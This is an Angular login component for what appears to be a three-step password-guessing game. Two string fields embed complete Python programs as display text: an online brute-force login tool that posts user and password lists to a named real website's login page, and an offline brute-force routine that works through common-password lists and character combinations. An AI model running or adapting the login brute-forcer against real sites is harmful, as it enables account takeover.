import { Component, OnInit, Injector } from "@angular/core";
import { BaseComponent } from "../common/commonComponent";
import Swal from "sweetalert2";
declare var $: any;
@Component({
  selector: "app-login",
  templateUrl: "./login.component.html",
  styleUrls: ["./login.component.scss"]
})
export class LoginComponent extends BaseComponent implements OnInit {
  public passwordData: any = {};
  public timer = 0;
  public step = 0;
  public leftProgress = 0;
  public rightProgress = 180;
  public program1 = `url = 'https://www.swatch.com/choose/login.php'
  userField = email'
  passwordField = 'pass'
  cd C:/path/to/Brute-Force-Login
  python main.py
  
  from sys import exit
  import requests
  
  def open_ressources(file_path):
      return [item.replace("\n", "") for item in open(file_path).readlines()]
  
  INCORRECT_MESSAGE = open_ressources('./ressources/incorrectMessage.txt')
  SUCCESS_MESSAGE = open_ressources('./ressources/successMessage.txt')
  PASSWORDS = open_ressources('./ressources/passwords.txt')
  USERS = open_ressources('./ressources/users.txt')
  LIMIT_TRYING_ACCESSING_URL = 7
  
  def process_request(request, user, password, failed_aftertry, user_field, password_field):
      """[summary]
      Arguments:
          request {[type]} -- [description]
          user {[type]} -- [description]
          password {[type]} -- [description]
          failed_aftertry {[type]} -- [description]
          user_field {[type]} -- [description]
          password_field {[type]} -- [description]
      """
      if "404" in request.text or "404 - Not Found" in request.text or request.status_code == 404:
          if failed_aftertry > LIMIT_TRYING_ACCESSING_URL:
              print ("[+] Connection failed : Trying again ....")
              return
          else:
              failed_aftertry = failed_aftertry+1
              print ("[+] Connection failed : 404 Not Found (Verify your url)")
      else:
          # if you want to see the text result remove the comment here
          #print data.text
          if INCORRECT_MESSAGE[0] in request.text or INCORRECT_MESSAGE[1] in request.text:
              print ("[+] Failed to connect with:\n user: "+user+" and password: "+password)
          else:
              if SUCCESS_MESSAGE[0] in request.text or SUCCESS_MESSAGE[1] in request.text:
                  result = "\n--------------------------------------------------------------"
                  result += "\\OK!! \nTheese Credentials succeed:\n> user: "+user+" and password: "+password
                  result += "--------------------------------------------------------------"
                  with open("./results.txt", "w+") as frr:
                      frr.write(result)
                  print("[+] A Match succeed 'user: "+user+" and password: "+password+"' and have been saved at ./results.txt")
                  return
              else:
                  print ("Trying theese parameters: user: "+user+" and password: "+password)
  
  def process_user(user, url, failed_aftertry, user_field, password_field):
      """[summary]
      Arguments:
          user {[type]} -- [description]
          url {[type]} -- [description]
          failed_aftertry {[type]} -- [description]
          user_field {[type]} -- [description]
          password_field {[type]} -- [description]
      """
      for password in PASSWORDS:
          dados = {user_field: user.replace('\n', ''),
                  password_field: password.replace('\n', '')}
          print ("[+]", dados)
          # Doing the post form
          request = requests.post(url, data=dados)
  
          process_request(request, user, password, failed_aftertry, user_field, password_field)
  
  def try_connection(url, user_field, password_field):
      """[summary]
      Arguments:
          url {[type]} -- [description]
          user_field {[type]} -- [description]
          password_field {[type]} -- [description]
      """
      print ("[+] Connecting to: "+url+"......\n")
      # Put the target email you want to hack
      #user_email = raw_input("\nEnter EMAIL / USERNAME of the account you want to hack:")
      failed_aftertry = 0
      for user in USERS:
          process_user(user, url, failed_aftertry, user_field, password_field)
  
  def manual_mode():
      """[summary]
      """
      print("[+] Manual mode selected ")
      print("[+] After inspecting the LOGIN <form />, please fill here :")
  
      # Field's Form -------
      # The link of the website
      url = input("\n[+] Enter the target URL (it's the 'action' attribute on the Login form):")
      # The user_field in the form of the login
      user_field = input("\n[+] Enter the User Field  (it's the 'name' attribute on the Login form for the username/email):")
      # The password_field in the form
      password_field = input("\n[+] Enter the Password field  (it's the 'name' attribute on the Login form for the password):")
  
  
      try_connection(url, user_field, password_field)
  
  
  def extract_field_form(html_contain):
      """[summary]
      Arguments:
          html_contain {[type]} -- [description]
      """
      print("[+] Starting extraction...")
  
  
  def automatic_mode():
      """[summary]
      """
      print("[+ This option is not yet ready....]")
      main()
      # # Field's Form -------
      # # The link of the website
      # url = input("\n[+] Enter the URL of the webSite and let me do the rest :")
      # r = requests.get(url)
      # extract_field_form(r.content)
  
  
  def main():
      """[summary]
      """
      print ("\n[+] # -------------------------------------------")
      print ("[+] # | __ )  |  ___| | |    ")
      print ("[+] # |  _ \\  | |_    | |    ")
      print ("[+] # | |_) | |  _|   | |___ ")
      print ("[+] # |____/  |_|     |_____| v0.0.2")
      print ("[+] # => Brute Force Login <=                     #")
      print ("[+] # By S@n1x d4rk3r                             #")
      print ("[+] # #############################################")
      print("[+] Select a mode for detecting fields:")
      print("[+] 1-) Automatic mode (Will get all necessary field and proceed)")
      print("[+] 2-) Manual mode (you will provide necessary information before continue)")
      print("[+] -")
      print("[+] 0-) Stop the program")
      mode = int(input("[+] Choice: "))
      if mode == 1: automatic_mode()
      elif mode == 2: manual_mode()
      elif mode == 0: exit()
      else: main()
  
  if __name__ == '__main__':
      main()`;
  public program2 = `import string
  from itertools import product
  from time import time
  from numpy import loadtxt
  
  def product_loop(password, generator):
      for p in generator:
          if ''.join(p) == password:
              print('\nPassword:', ''.join(p))
              return ''.join(p)
      return False
  
  def bruteforce(password, max_nchar=8):
      """Password brute-force algorithm.
      Parameters
      ----------
      password : string
          To-be-found password.
      max_nchar : int
          Maximum number of characters of password.
      Return
      ------
      bruteforce_password : string
          Brute-forced password
      """
      print('1) Comparing with most common passwords / first names')
      common_pass = loadtxt('probable-v2-top12000.txt', dtype=str)
      common_names = loadtxt('middle-names.txt', dtype=str)
      cp = [c for c in common_pass if c == password]
      cn = [c for c in common_names if c == password]
      cnl = [c.lower() for c in common_names if c.lower() == password]
  
      if len(cp) == 1:
          print('\nPassword:', cp)
          return cp
      if len(cn) == 1:
          print('\nPassword:', cn)
          return cn
      if len(cnl) == 1:
          print('\nPassword:', cnl)
          return cnl
  
      print('2) Digits cartesian product')
      for l in range(1, 9):
          generator = product(string.digits, repeat=int(l))
          print("\t..%d digit" % l)
          p = product_loop(password, generator)
          if p is not False:
              return p
  
      print('3) Digits + ASCII lowercase')
      for l in range(1, max_nchar + 1):
          print("\t..%d char" % l)
          generator = product(string.digits + string.ascii_lowercase,
                              repeat=int(l))
          p = product_loop(password, generator)
          if p is not False:
              return p
  
      print('4) Digits + ASCII lower / upper + punctuation')
      # If it fails, we start brute-forcing the 'hard' way
      # Same as possible_char = string.printable[:-5]
      all_char = string.digits + string.ascii_letters + string.punctuation
  
      for l in range(1, max_nchar + 1):
          print("\t..%d char" % l)
          generator = product(all_char, repeat=int(l))
          p = product_loop(password, generator)
          if p is not False:
              return p
  
  
  # EXAMPLE
  start = time()
  bruteforce('sunshine') # Try with '123456' or '751345' or 'test2018'
  end = time()
  print('Total time: %.2f seconds' % (end - start))`;
  showHome = false;
  constructor(inj: Injector) {
    super(inj);
  }

  ngOnInit() {
    if (this.getToken("guessedData")) {
      let data = JSON.parse(this.getToken("guessedData"));
      this.step = data.length;
    }
  }
  ngAfterViewInit() {
    setTimeout(() => {
      this.showHome = true;
    }, 500);
  }
  disabled = false;
  submitForm(form) {
    this.disabled = true;
    if (form.valid) {
      let gussedPassword = false;
      if (this.getToken("guessedData")) {
        let data = JSON.parse(this.getToken("guessedData"));
        data.forEach(element => {
          if (element.password === this.passwordData.password) {
            gussedPassword = true;
          }
        });
      }
      if (!gussedPassword) {
        if (this.step < 3) {
          this.commonService
            .callApi(
              "/passordCheck?password=" + this.passwordData.password,
              {},
              "get",
              false,
              true
            )
            .then((res: any) => {
              if (res.status) {
                this.step = this.step + 1;
                const gussedData =
                  JSON.parse(this.getToken("guessedData")) || [];
                gussedData.push({
                  step: this.step,
                  password: this.passwordData.password
                });
                this.disabled = false;
                if (this.step < 3) {
                  Swal.fire({
                    title: "Success",
                    text: `Congratulations, your step ${this.step} is cleared. Do you want to continue`,
                    icon: "success",
                    showCancelButton: true,
                    confirmButtonText: "Yes",
                    cancelButtonText: "No"
                  }).then(result => {
                      this.passwordData.password = "";
                      if(!result.value){
                        Swal.fire({
                          title: "",
                          text: 'You can try again anytime.',
                          confirmButtonText: "Ok"
                        });        
                      }
                  });
                } else {
                  Swal.fire({
                    title: "Success",
                    text: `Congratulations, your step ${this.step} is cleared. You are now winner.`,
                    icon: "success",
                    confirmButtonText: "Ok"
                  });
                }
                this.setToken("guessedData", JSON.stringify(gussedData));
              } else {
                this.disabled = false;
                if (this.step === 0) {
                  this.timer = 15;
                  this.leftProgress = 360;
                  this.passwordData.password = '';
                  let interval = setInterval(() => {
                    if (this.timer) {
                      this.timer = this.timer - 1;
                      this.leftProgress = this.leftProgress - 24;
                      if (!this.timer) {
                        clearInterval(interval);
                      }
                    }
                  }, 1000);
                }
                Swal.fire({
                  title: "Oops...",
                  text: res.message,
                  icon: "error",
                  confirmButtonText: "Try Again"
                });
              }
            });
        } else {
          this.disabled = false;
          Swal.fire({
            title: "Success",
            text: `You are already a winner`,
            icon: "success",
            confirmButtonText: "Ok"
          });
        }
      } else {
        if (this.step === 3) {
          this.disabled = false;
          Swal.fire({
            title: "Success",
            text: `You are already a winner`,
            icon: "success",
            confirmButtonText: "Ok"
          });
        } else {
          Swal.fire({
            title: "Warning",
            text: `This password already guessed`,
            icon: "warning",
            confirmButtonText: "Ok"
          });
          this.disabled = false;
        }
      }
    }
  }
}
